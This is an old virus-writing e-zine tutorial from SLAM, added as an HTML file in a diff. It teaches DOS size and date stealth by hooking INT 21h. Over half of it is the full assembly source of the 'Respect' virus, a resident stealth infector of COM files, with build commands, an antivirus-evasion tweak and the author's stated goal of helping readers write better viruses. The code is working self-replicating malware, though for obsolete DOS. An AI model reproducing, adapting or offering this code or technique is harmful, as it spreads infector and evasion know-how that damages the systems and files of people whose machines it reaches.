@@ -1,0 +1,633 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Simple Tutorial to Stealth Virii - Part #1</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+3>Simple Tutorial to Stealth
+Virii<BR>
+Part #1 - Size Stealth #1<BR>
+</FONT><FONT SIZE=+2>by Virtual Daemon [SLAM]</FONT></FONT></B></P></CENTER>
+
+<CENTER><P><FONT COLOR="#004080"><FONT SIZE=+1><A HREF="tumisc38.htm">part
+#2<BR>
+</A><A HREF="tumisc39.htm">part #3</A></FONT></FONT></P></CENTER>
+
+<P>
+<HR WIDTH="100%"></P>
+
+<UL>
+<PRE>               
+    Well, here's another lame tutorial written by me... ;-))
+ I wrote this shit in december 1996, but since SLAM#3 is out I've re-aranged
+ it a little, and here it is...
+   The reason why I'm writting all this tutorials, is because I want to make
+ other people learn this stuff, learn how to create better virii. These
+ tutorials should provide enough informations for people who don't know this
+ stuff already... Anyway, I'm gonna make more tutorials as soon as I'm
+ learning something new. Every new step I'll make in virii development will be
+ followed by a tutorial. During 1 year and a half, I've written several
+ tutorials... A big part of them will be presented in future releases of SLAM
+ Magazine. I hope that I'll make some new tutorials this year, bcoz I've
+ learned a lot since then, and I think that would be good if I'll share my
+ knowdlege with others! p.s. Hey lamers! Watch out! This tutorials are for
+ smart people who want and like to learn how to create virii, not for U! Go
+ play with your d*ck in the ground, and leave this phile now!!! The virus
+ included in this phile is made for research only... Anyway, it's kind of old
+ an kind of lame, so I guess you can do whatever you want with it! &quot;WHATEVER&quot;
+ doesn't mean that you just take the virus, put your name in it, and
+ distribute it saying that it's yours! ;) That makes you a big fuckin lamer!
+ And I hate lamers (shit, who doesn't? ;)))!
+   But let's get back to the show... :-P
+
+   Some of U are wondering what a stealth virus is. Well, a stealth virus is a
+ virus who can practicaly hide in your system. Many viruses have included this
+ feature during the years, some better, some not... So, a stealth virus can't
+ be seen so easily... it can hide from your memory, from your files even from
+ your MBR/boot! In a word it can be &quot;almost&quot; invisible!
+
+   In this tutorial I will talk more about the size stealth, and less about
+ other methods. At the end of the tutorial I've included a virus made by me
+ (it's pretty old) called &quot;Respect&quot;! ;) The virus traps INT 21h and will
+ infect COM files on 4bh(=execute). The stealth function are implemented for
+ 11h/12h (FCB), 4eh/4fh (DTA) and 5700h (get file time/date).
+
+  What is size stealth? Well, size stealth is a method wich can hide your true
+ filesize. This way, if a virus of 356 bytes infected a file of 22334 bytes,
+ the infected file size will be 22334+356=22690, right? Well, the size stealth
+ method will practicaly &quot;cut&quot; the last 356 bytes (size of virus), so the
+ infected file will have only 22334 bytes, just like the beginning.
+ Conclusion: the file was infected but the size is still the same.
+  How's that possible? Well, there are two steps (A and B ;)...
+
+   The DOS operating system has 2 methods for searching files: one via FCB
+ (11h/12h) and the other with file handles (4eh/4fh).
+A)  The 1st step is to hide the file size for (sub)programs like DIR.
+   DIR uses the 11h/12h DOS function (FCB) althought almost all the other
+ programs from DOS 2+ are using the file handles method. So, we have to hide
+ our file from both, FCB and file handles.
+B)  Well, here goes the 2nd step: to hide your virus from programs that search
+  files via file handles method (programs like Norton Commander, or other shity
+  shells)...
+
+   Got it? Ok. So, all we have to do is to make a TSR virus with handler on
+ INT 21h, who can trap the 4bh (for infection), 11h, 12h, 4eh,4fh (for size
+ stealth) and 5700h (for hiding the modified date/time) DOS functions.
+   When INT 21h is called by DOS, the function requested will be first
+ intercepted by our handler, right? We compare the function which is executed
+ with 11h,12h,4eh or 4fh functions, and if equal, we're gonna try to cut the
+ size of the file... Now, all we have to do to make it stealth (to cut it)
+ is to get the file size, then to substract the size of our virus, and then
+ to put it back (the size of the file) in memory... Simple, ha'? ;)
+
+   But there's a little problem... How can we know if the file is infected
+ with our virus? We can't just &quot;cut&quot; all the COM (or EXE) files that are being
+ searched with one of the above functions (11h,12h,4eh,4fh)... ;(
+ Well, we just have to &quot;mark&quot; our file in some way! We can check if the
+ 4th byte or something is equal to xx (our value) and then we'll cut it.
+ Good ideea, BUT too much code for this shit, don't U think? And of course
+ the system will go too slow! We'll have to open the file, then read, then
+ compare, and then close it back.
+   No, this is not a good ideea! There are a very small number of virii
+ who are checking with this method, and that bcoz their authors don't care
+ too much about the virus size, or about their speed.
+   There's another method for doing this. We'll mark our file in another
+ way. We'll *fuck* (read &quot;modify&quot; ;) the years number!!! :)
+   When U're trying to view a file's date, U'll probably get something
+ like this: 05-27-96! Well, 05 is the month, 27 the day of the month and
+ (19)96 the year, right? What do U think it will happen if we'll just add
+ 100 to number of years? The year will be 2096, but U will still see the
+ date like 05-27-96!!! Of course, there are some programs who can display
+ the whole year, and this is the reason why we're gonna intercept the get
+ file date/time DOS function (AX=5700h)!
+   So, we'll have to check if some program tryes to find out the date/time
+ of our infected file. If we wouldn't check for this, then maybe the
+ respective program will find our date (which will be 2096 if the original
+ file year was 1996)... The user will see that his file has an invalid date
+ so he will guess that maybe he has a virus! That's why, in our INT 21h
+ handler, we must check for 5700h (DOS Function=get file date/time). If the
+ 5700h function is requested by a program, our handler will trap the request
+ first. What we have to do is a little check if the specified file is
+ infected with our virus, and if so, we'll substract 100 years, and we'll
+ put the new value in memory. This way, the user will see that his file was
+ created/last modified in 1996! So, the user will turn into a big fucking
+ lamer and he will think that everything is OK, and that he has no virus!
+ Well, I guess this is our sacred duty.... TO FUCK LAMERS! ;))))
+
+   Another way for marking the file is to modify the seconds number. We'll
+ choose a number, and in every file that gets infected will just gonna modify
+ the original file's seconds with our value.
+   It's obvious why we can't modify the hours/minutes/day/month! That can be
+ seen almost by anyone! Anyway, U can do it if U really want to... Nobody
+ will stop ya'! Well, nobody except the AVers...:)
+
+   So we have two ways: the century method and the seconds method...
+ But first, let's see how our INT 21h handler is gonna look:
+
+ my_int21_handler:
+    ...           ;here we're gonna check if the virus has alredy been
+                  ; infected... or other stuff ;)
+    cmp ah,4bh    ;is the file being executed or loaded?
+    jne next      ; nnneeeeaahhhhh... ;( Too bad!
+    jmp infect    ; Great, we'll try to infect it!
+ next:
+    cmp ah,11h            ;\
+    je FCB_stealth        ;  \
+    cmp ah,12h            ;    \
+    je FCB_stealth        ;      \ Here we check if it's a search function,
+    cmp ah,4eh            ;      / and if so, will try to &quot;stealth&quot; the file
+    je DTA_stealth        ;    /
+    cmp ah,4fh            ;  /
+    je DTA_stealth        ;/
+    cmp ax,5700h          ;anyone likes to see the file's date/time? ;)
+    je time_stealth       ;in the Respect virus, the time_stealth procedure
+                          ; was too far from the INT 21h handler, so this
+                          ; jump was replaced by &quot;jne exithandler
+                          ;                       jmp time_stealth&quot;
+    ; P.S. I told U this bcoz I don't wanna see ya confused or anything! ;-)
+ exithandler:
+    db 0eah       ;exit from our handler and return to original INT 21h
+ oldint21   dd ?  ;variable which contains the old INT 21h segment/offset
+
+  In the Respect virus, I added 100 years to original year of the file...
+ So, I'm using the century method to check if the file is already infected.
+ The seconds method is practically the same with the century method... All
+ you have to do is to modify some basic instructions. Here's an example for
+ seting the seconds number to 60:
+
+ a) for marking:
+    -----------
+     mov ax,5701h               ;set file date/time
+     mov cx,file_time           ;get original file time
+     mov dx,file_date           ;get original file date
+     or cl,1eh                  ;set the seconds number to 60
+     int 21h
+ b) for checking:
+    ------------
+     ;get timestamp in ax
+     and al,1eh         ;test if infected (1eh=30)
+     cmp al,1eh         ;check if al=30 (number of seconds div 2)
+     jnz error          ;if not equal then don't stealth
+     ;here comes the stealth part
+
+  Ok. Now that you've got all this crap, I'm gonna try to explain the theory
+ of the size stealth method. I wont give ya' any examples bcoz the stealth
+ procedures from the Respect virus are very well commented (I think! ;-)...
+
+  We'll begin with the FCB method...
+  What U have to do first is to fake a DOS call, bcoz you don't have
+ anything to stealth right now. If no errors have encountered you must get
+ the PSP (Program Segment Prefix) from memory. You can do that in 2 ways:
+ one with 51h and the other with 62h. Both this functions will return in
+ es:bx the current PSP. Then you must check if the PSP is ok (if it's the
+ DIR command who's calling not ChkDsk or other shit). Next you have to get
+ the DTA's adress with the DOS function 2fh. It will return the address of
+ the start of the current DTA in es:bx. After this, you must check if the
+ FCB is extended or not. The difference between the &quot;normal&quot; FCB and the
+ extended FCB is that the 2nd one has some extra bytes more then the normal
+ FCB (there are some DOS reserved areas in that bytes). So, to access the
+ bytes that we want we must skip some bytes if the FCB is extended. Actually,
+ we must skip about 7 bytes.
+   I will make a little paranthese here to tell ya' the structure of FCB
+ (file control block) and the structure of extended FCB.
+
+  Normal FCB:
+  Offset   Size   Description
+  ------   ----   ------------
+  00h       1     Drive id (00=actual, 01=A:, 02=B:, 03=C: etc.)
+  01h       8     File name.Space filled if less than 8 characters
+  09h       3     File extension
+  0Ch       2     Current block number
+  0Eh       2     Logical record size (bytes)
+  10h       4     File size in bytes
+  14h       2     Date (last modified)
+  16h       2     Time (last modified)
+  18h       4     DOS Reserved area
+ &thorn;1Ch       4     Same as 10h (this is what you see on your screen)
+  20h       1     Offset from actual register
+  21h       4     Relative record
+    &thorn;=offset modified by our virus
+
+  Extended FCB: looks almost the same as normal FCB, except there are 7 bytes
+  added to the beginning (before offset 00h)
+  Offset   Size   Description
+  ------   ----   -----------
+  -07h      1     always FFh. This flag indicate that this is extended FCB
+  -06h      5     Reserved by DOS
+  -01h      1     File attribute
+  +00h      25h   Normal FCB
+
+
+  Well, I hope you understand what's going on..;) Anwyay, all the &quot;heavy&quot; job
+ is done. What's left to be done, is to get in ax the datestamp (or timestamp)
+ then to check if you have infected the file, and then to substract the size
+ of your virus from the file's size (that can be done by modifying offset 1ch
+ where the file size is stored). Of course, before this, you can check if the
+ filesize isn't too small.
+
+   Got it till now? If you don't get it right now, don't worry... just read
+ the phile again and then see how the Respect virus is made, and you WILL
+ get it! ;) This stuff should not take you much then 15 minutes (maximum)
+ to understand it!
+
+   Ok. Now, let me explain the file handles stealth method (DTA_stealth)...
+   The DTA stealth method is practically the same with the FCB method, just
+ a little simpler... Again, you must begin with a fake int 21h call. The
+ errors can be checked with a simple &quot;jc&quot; (jump if CF=1), bcoz the 4eh/4fh
+ DOS functions automaticaly sets up the carry flag on error. After this...
+ the same old story: get the DTA, then the date/time stamp, do some checkin
+ and then stealth the file!
+
+   Hmmm... Think that's all... I don't know what else I could say about the
+ size stealth method. Anyway, the Respect virus is here, and the stealth
+ functions are well commented (I think), so U shouldn't have any problems
+ with it!
+   Oh yeah... I forgot something! Respect is a TSR COM virus. If you wanna
+ make an TSR stealth that will infect EXE files you must stealth the high
+ word too! Here's an example:
+  sbb word ptr es:[bx+1fh],0    ;insert this in the FCB_stealth procedure
+  sbb word ptr es:[bx+1ch],0    ;insert this in the DTA_stealth procedure
+
+   Remember: this is a stealth tutorial, not a tutorial on how to make TSR
+ virii!!! If you don't know how to make a TSR virus, then I guess you wont
+ understand much from this tutorial...
+
+  P.S. In the next issue I'll try to explain the Full Stealth method
+  (infection/desinfection) or the memory stealth method or the MBR/BS method!
+  Dunno which of those right now, but I'll certanly do one of it! It's pretty
+  easy to do it, and I guess there are some guys who would like to know that!
+
+  Well, enjoy reading the virus! Peace! ;)
+
+<B>----- cut here -----
+</B>; Virus Name: Respect
+; Virus Author: Virtual Daemon
+; Group: SLAM
+; Virus Type: TSR stealth COM infector
+; Virus Size: 624 bytes
+; Virus created on 14 January 1997 (dunno what time but I think it was
+;                   morning... maybe at 3-4 am... ;)))
+;
+; Comments: -infection on 4bh (=execute)
+;           -stealth on 11h/12h (FCB) and 4eh/4fh (DTA)
+;           -intercept 5700h for more &quot;stealthness&quot; ;)))
+;           -INT 24h handler (for errors)
+;           -restore original file date/time/attributes
+;           -no payload, no encryption... :( just for learning basic stealth!
+; To compile use: TASM respect.asm 
+;                 TLINK respect.obj
+;                 EXE2BIN respect.exe respect.com
+;                 DEL respect.exe  \
+;                 DEL respect.obj   =&gt; delete un-necessary files
+;                 DEL respect.map  /
+.model tiny
+.code
+   org 0
+begin:
+   call start
+start:
+   pop bp
+   sub bp,offset start
+
+   push ds
+   push es
+
+   mov ax,'=-'                  ;check if the virus is already installed
+   int 21h
+   cmp cx,'-='
+   je complete
+
+   mov ah,4ah                   ;get largest block available
+   mov bx,0ffffh
+   int 21h
+
+   sub bx,(endheap-begin+15)/16+1       ;substract from it our virus
+   mov ah,4ah
+   int 21h
+   jc complete
+   sub word ptr ds:[2],(endheap-begin+15)/16+1
+
+   mov ah,48h                   ;allocate memory for the virus
+   mov bx,(endheap-begin+15)/16
+   int 21h
+   jc complete
+
+   mov es,ax
+   dec ax
+   mov ds,ax
+
+   mov byte ptr ds:[0],'Z'      ;mark the MCB
+   mov ax,8                     ;F-Prot will no longer detect a new Chill
+   mov word ptr ds:[1],ax       ;variant....
+
+   push cs
+   pop ds
+   xor di,di
+   mov cx,(heap-begin)/2+1
+   mov si,bp
+   rep movsw                    ;load the virus in memory
+
+   xor ax,ax
+   mov ds,ax
+   push ds
+   lds ax,ds:[21h*4]            ;save old INT 21h interrupt vector
+   mov word ptr es:oldint21,ax
+   mov word ptr es:oldint21+2,ds
+   pop ds
+   mov word ptr ds:[21h*4],offset int21 ;set our INT 21h handler
+   mov ds:[21h*4+2],es
+complete:
+   pop es
+   pop ds
+   lea si,[bp+offset jmpbuf]    ;restore saved bytes
+   mov di,100h
+   push di
+   movsw
+   movsb
+   retn                         ;return to host
+jmpbuf   db 0cdh,20h,0
+
+
+; our INT 24h handler
+int24:
+   mov al,3h                    ;don't display errors
+   iret
+
+; the INT 21h handler
+int21:
+   cmp ax,'=-'
+   jne continue
+   mov cx,'-='
+   iret
+continue:
+   cmp ah,4bh
+   jne next
+   jmp infect
+next:
+   cmp ah,11h
+   je FCB_stealth
+   cmp ah,12h
+   je FCB_stealth
+   cmp ah,4eh
+   je DTA_stealth
+   cmp ah,4fh
+   je DTA_stealth
+   cmp ax,5700h
+   jne exithandler
+   jmp time_stealth
+exithandler:
+   db 0eah
+oldint21   dd ?
+
+; The FCB stealth method = hides infected file(s) from DIR
+FCB_stealth:
+   pushf
+   push cs
+   call exithandler             ;fake a int 21h call
+                                ;on return ds:dx will point to unopened FCB
+   or al,0                      ;check if the dir call was sucessfull...
+                                ;al=0 =&gt; no errors
+   jnz skip_dir                 ;if error then return to original 11h/12h
+   push ax bx es                ;save ax,bx and es registers
+
+   mov ah,51h                   ;DOS function=get current PSP to es:bx
+   int 21h
+   mov es,bx
+   cmp bx,es:[16h]              ;is the PSP ok? we must check if it's a DIR
+   jnz error                    ; call and not other programs
+
+   mov bx,dx                    ;get offset to unopened FCB in bx
+   mov al,[bx]                  ;al holds current drive
+   push ax                      ;extended FCB=FFh
+   mov ah,2fh                   ;DOS function=get DTA area in es:bx
+   int 21h
+
+   pop ax                       ;restore ax (can be 0 or FFh)
+   inc al                       ;if the FCB is extended then FFh+1=0
+                                ;if not then 0 + 1 = 1 &lt;&gt; 0
+   jnz no_ext                   ;not EXTENDED? Proceed then... ;)
+   add bx,7                     ;if EXTENDED then bx:=bx+7
+                                ;EXTENDED FCB's have some extra bytes so we
+                                ; must skip those bytes
+no_ext:
+   cmp word ptr es:[bx+1fh],0   ;is &gt; 65k?
+   jnz error                    ;guess so... ;( gotta go then!
+   mov ax,es:[bx+19h]           ;get datestamp in ax
+   cmp ah,100                   ;if ah is greater then 100 then the file
+                                ; is infected with our virus
+   jb error                     ;if not then get out of here!
+
+   ror ah,1                     ;rotate to right
+   sub ah,100                   ;years=years-100 =&gt; the original file's year
+   rol ah,1                     ;rotate to left
+   mov es:[bx+19h],ax           ;restore the original year in memory
+
+   sub word ptr es:[bx+1dh],(heap-begin) ;substract our virus size
+error:
+   pop es bx ax                 ;restore registers es, bx and ax
+skip_dir:
+   retf 2                       ;return far
+
+; The file handle stealth method = hides infected file(s) from progs like NC
+DTA_stealth:
+   pushf
+   push cs
+   call exithandler             ;fake a int 21h call
+   jc no_files                  ;the 4eh/4fh functions automaticaly
+                                ; set up the carry flag on error
+
+   pushf                        ;push the flags bcox they will be destroyed
+                                ; by the int call
+   push ax di es bx             ;save ax,di,es and bx registers
+
+   mov ah,2fh                   ;DOS function=get DTA area in es:bx
+   int 21h
+
+   mov ax,es:[bx+18h]           ;get datestamp
+   cmp ah,100                   ;check if above 100
+   jb not_inf                   ;if not return
+
+   cmp word ptr es:[bx+1ah],(heap-begin) ;check if the file is too small
+   ja hide                      ;if not too small go and stealth it
+   cmp word ptr es:[bx+1Ch],0   ;check if too large
+   je not_inf
+hide:
+   ror ah,1
+   sub ah,100                   ;get the original file's year back
+   rol ah,1
+   mov es:[bx+18h],ax           ;put the original year in memory
+
+   sub word ptr es:[bx+1ah],(heap-begin)  ; hide file size
+not_inf:
+   pop bx es di ax              ;restore bx,es,di and ax registers
+   popf                         ;restore flags
+no_files:
+   retf 2                       ;return far
+
+; The time stealth method = hides infected file(s)'s time/date from being seen
+time_stealth:
+   pushf
+   call dword ptr cs:[oldint21] ;fake a int 21h call
+   jc shit                      ;if error then return
+   cmp dh,100                   ;check if years &gt; 100
+   jb no_way                    ;if not then return
+   ror dh,1                     ;\
+   sub dh,100                   ; &quot;adjust&quot; the file's year :-)
+   rol dh,1                     ;/
+no_way:
+   iret                         ;return
+shit:
+   retf 2                       ;return far
+
+
+infect:
+   pushf
+   push ax bx cx dx si di bp ds es
+   push ds
+   push dx
+
+   mov ax,3524h                 ;get old INT 24h handler
+   int 21h
+   mov word ptr cs:[old_int24],bx
+   mov word ptr cs:[old_int24+2],es
+
+   push cs
+   pop ds
+   lea dx,int24                 ;set our INT 24h handler
+   mov ax,2524h
+   int 21h
+
+   pop dx
+   pop ds
+   mov ax,4300h                 ;get file attributes
+   int 21h
+   push ds
+   push dx
+   push cx
+
+   mov ax,4301h                 ;set new attributes (archive only)
+   xor cx,cx
+   int 21h
+
+   mov ax,3d02h                 ;open the file for reading and writting
+   pushf
+   push cs
+   call exithandler
+   xchg ax,bx
+
+
+   mov ax,5700h                 ;get file's date/time
+   pushf
+   call dword ptr cs:[oldint21]
+   mov word ptr cs:[file_time],cx
+   mov word ptr cs:[file_date],dx
+
+   push cs
+   pop ds
+   push cs
+   pop es
+
+   mov ah,3fh                   ;read from file the first 3 bytes
+   lea dx,buffer                ;save them into our buffer
+   mov cx,3
+   int 21h
+
+   mov ax,4202h                 ;go to EOF
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov word ptr file_size,ax
+   mov word ptr file_size+2,dx
+
+   cmp word ptr buffer,'MZ'     ;check if EXE
+   je close_file
+   cmp word ptr buffer,'ZM'
+   je close_file
+
+   mov ax,word ptr file_size    ;check if too big
+   cmp ax,65535-(endheap-begin)
+   ja close_file
+
+   mov cx,word ptr buffer+1     ;check if already infected
+   add cx,heap-begin+3
+   cmp ax,cx
+   je close_file
+
+   mov di,offset jmpbuf         ;prepare new JMP
+   mov si,offset buffer
+   movsb
+   movsw
+   mov byte ptr [offset buffer],0e9h
+   sub ax,3
+   mov word ptr [offset buffer+1],ax
+
+   mov ah,40h                   ;write the virus to file
+   lea dx,begin
+   mov cx,heap-begin
+   int 21h
+
+   mov ax,4200h                 ;go to BOF
+   xor cx,cx
+   cwd
+   int 21h
+
+   mov ah,40h                   ;write the new JMP
+   lea dx,buffer
+   mov cx,3
+   int 21h
+
+   mov ax,5701h                 ;set old file's time/date
+   mov cx,word ptr cs:[file_time]
+   mov dx,word ptr cs:[file_date]
+   ror dh,1                     ;mark the file for steath
+   add dh,100
+   rol dh,1
+   int 21h
+close_file:
+   mov ah,3eh                   ;close the file
+   int 21h
+
+   mov ax,4301h                 ;set old attributes
+   pop cx
+   pop dx
+   pop ds
+   int 21h
+
+   mov ds,word ptr cs:[old_int24+2]
+   mov dx,word ptr cs:[old_int24]
+   mov ax,2524h                 ;set old INT 24h handler
+   int 21h
+exit:
+   pop es ds bp di si dx cx bx ax
+   popf
+   jmp exithandler
+
+old_int24   dd ?
+virus_name  db 'Respect'
+signature   db '[VD/SLAM]'
+heap:
+file_size   dd ?
+file_time   dw ?
+file_date   dw ?
+buffer   db 3 dup (?)
+endheap:
+end begin
+<B>----- cut here -----
+
+</B>  Tools used: Turbo Assembler 3.2, Turbo Linker 5.1, Tech Help 4.0a + a text 
+ editor... :)
+
+  You can reach me via e-mail at: <A HREF="mailto:virtual_daemon@hotmail.com">virtual_daemon@hotmail.com</A>
+</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+
+</PRE>
+
+</BODY>
+</HTML>
